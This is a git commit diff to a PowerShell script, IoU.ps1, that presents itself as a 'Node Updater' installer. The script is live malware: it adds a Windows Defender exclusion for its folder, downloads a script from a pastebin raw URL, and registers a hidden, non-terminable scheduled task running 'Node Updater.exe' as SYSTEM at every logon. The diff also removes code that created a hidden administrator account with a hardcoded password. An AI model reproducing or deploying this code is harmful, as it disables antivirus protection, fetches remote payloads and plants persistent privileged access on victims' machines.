0fc77b061cd77feb65b577a831d0fd2306153190
nodeupdater2 <160264969+nodeupdater2@users.noreply.github.com>
2025-05-12 18:48:13 +0300

    Update IoU.ps1

--- IoU.ps1
+++ IoU.ps1
@@ -1,26 +1,7 @@
 $path = "C:\Program Files\Node Updater";
 
-$username = "NT-SECURITY";
-$password = "p5Te3mC1sC84";
-$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
-
 if (-Not (Test-Path $path)) {
     New-Item -Path $path -ItemType Directory -Force > $null 2>&1;
-}
-
-if (-Not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) {
-	New-LocalUser -Name $username -Password $securePassword -AccountNeverExpires -PasswordNeverExpires -UserMayNotChangePassword > $null 2>&1;
-	
-	Add-LocalGroupMember -Group "Administrators" -Member $username;
-	
-	$userSID = (Get-LocalUser -Name $username).SID.Value;
-    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList";
-    if (-Not (Test-Path $regPath)) {
-        New-Item -Path $regPath -Force > $null 2>&1;
-    }
-    New-ItemProperty -Path $regPath -Name $username -Value 0 -PropertyType DWord -Force > $null 2>&1;
-	
-	Start-Process "cmd.exe" -WorkingDirectory (Split-Path "C:\Windows\System32") -Credential ([System.Management.Automation.PSCredential]::new($username, $securePassword)) -ArgumentList "/C";
 }
 
 Add-MpPreference -ExclusionPath $path;
@@ -35,6 +16,6 @@ Invoke-WebRequest -Uri "https://pastebin.com/raw/JnKYFey2" -OutFile "C:\Windows\
 
 Remove-Item -Path "C:\Windows\Temp\CFT.ps1";
 
-Register-ScheduledTask -TaskName "Node Updater" -Action (New-ScheduledTaskAction -Execute "$path\Node Updater.exe" -WorkingDirectory $path) -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Settings (New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Seconds 0) -Hidden -DontStopOnIdleEnd -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DisallowHardTerminate -Priority 0 -Compatibility Win8) -User $username -Password $password -RunLevel Highest -Force > $null 2>&1;
+Register-ScheduledTask -TaskName "Node Updater" -Action (New-ScheduledTaskAction -Execute "$path\Node Updater.exe" -WorkingDirectory $path) -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Settings (New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Seconds 0) -Hidden -DontStopOnIdleEnd -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DisallowHardTerminate -Priority 0 -Compatibility Win8) -User "SYSTEM" -RunLevel Highest -Force > $null 2>&1;
 
 Start-ScheduledTask -TaskName "Node Updater";
